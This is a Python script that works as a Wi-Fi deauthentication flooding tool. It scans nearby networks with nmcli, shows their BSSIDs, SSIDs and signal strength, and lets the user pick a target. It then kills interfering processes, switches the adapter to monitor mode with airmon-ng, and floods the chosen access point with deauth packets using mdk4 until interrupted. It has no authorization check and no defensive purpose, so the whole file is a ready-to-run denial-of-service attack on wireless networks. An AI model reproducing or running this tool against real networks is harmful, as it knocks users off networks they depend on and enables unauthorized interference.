#!/usr/bin/python3
import os

# Define color constants
GREEN = '\033[32m'
DEFAULT = '\033[39m'
ORANGE = '\033[93m'
RED = '\033[31m'

def clear_screen():
    os.system('clear')

def get_devices():
    cmd = 'ifconfig'
    output = os.popen(cmd).read().split('\n\n')
    devices = [i.split(': ')[0] for i in output if 'wlan' in i]
    return devices

def select_adapter(devices):
    print('Select Adapter')
    for i, device in enumerate(devices):
        print(f'{GREEN}[{i}] - {device}{DEFAULT}')
    while True:
        try:
            adapter = int(input('\nSelect Adapter: '))
            if 0 <= adapter < len(devices):
                return adapter
        except ValueError:
            print(f'{RED}Invalid input, try again.{DEFAULT}')

def get_networks():
    cmd = 'nmcli --terse -f BSSID,SSID,CHAN,SIGNAL dev wifi'
    output = os.popen(cmd).read().strip().split('\n')
    networks = [line.replace('\\:', '..').split(':') for line in output if line]
    networks = {i: {'BSSID': n[0].replace('..', ':'), 'SSID': n[1], 'CHANNEL': n[2], 'SIGNAL': n[3]} for i, n in enumerate(networks)}
    return networks

def display_networks(networks):
    l_ssid = max(len(net['SSID']) for net in networks.values())
    print(f"NO.    BSSID{' ' * 16}SSID{' ' * (l_ssid)}SIG{' ' * 4}CHANNEL\n{'-' * (l_ssid + 46)}")
    for i, net in networks.items():
        signal_color = get_signal_color(int(net['SIGNAL']))
        print(f"{i:<3}    {net['BSSID']}    {net['SSID']:<{l_ssid}}    {signal_color}{net['SIGNAL']:<3}{DEFAULT}    {net['CHANNEL']}")

def get_signal_color(signal_strength):
    if signal_strength > 50:
        return GREEN
    elif signal_strength > 30:
        return ORANGE
    else:
        return RED

def select_network(networks):
    while True:
        try:
            network = int(input('\nSelect Network: '))
            if 0 <= network < len(networks):
                return networks[network]
        except ValueError:
            print(f'{RED}Invalid input, try again.{DEFAULT}')

def start_monitor_mode(adapter):
    os.system('sudo airmon-ng check kill > /dev/null 2>&1')
    os.system(f'sudo airmon-ng start {adapter}')

def display_network_details(network):
    net = network
    print(f"BSSID : {net['BSSID']}")
    print(f"SSID : {net['SSID']}")
    print(f"CHANNEL : {net['CHANNEL']}")
    print(f"SIGNAL : {net['SIGNAL']}\n")
    print(f"Flooding {GREEN}{net['SSID']} - {net['BSSID']}{DEFAULT} with Deauth Packets")

def flood_network(adapter, network):
    cmd = f"sudo mdk4 {adapter}mon d -c {network['CHANNEL']} -B {network['BSSID']}"
    try:
        process = os.popen(cmd)
        while True:
            line = process.readline().strip()
            if line.startswith('Packets'):
                print(f"{ORANGE}[+] {line}{DEFAULT}")
    except KeyboardInterrupt:
        pass
    finally:
        cleanup(adapter)

def cleanup(adapter):
    clear_screen()
    print(f'Disabling Monitor Mode On {adapter}')
    os.system(f'sudo airmon-ng stop {adapter}mon ')
    os.system(f'sudo ifconfig {adapter} down')
    os.system(f'sudo iwconfig {adapter} mode managed')
    os.system(f'sudo ifconfig {adapter} up')
    os.system('sudo service NetworkManager restart')
    clear_screen()


def main():
    clear_screen()
    devices = get_devices()
    adapter_index = select_adapter(devices)
    adapter = devices[adapter_index]
    clear_screen()
    networks = get_networks()
    if not networks:
        input(f'{RED}No WIFI Networks FOUND{DEFAULT}, Press Enter To Exit')
        exit()
    display_networks(networks)
    network = select_network(networks)
    clear_screen()
    start_monitor_mode(adapter)
    display_network_details(network)
    flood_network(adapter, network)

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f'{RED}An error occurred: {e}{DEFAULT}')
        if 'adapter' in locals():
            cleanup(adapter)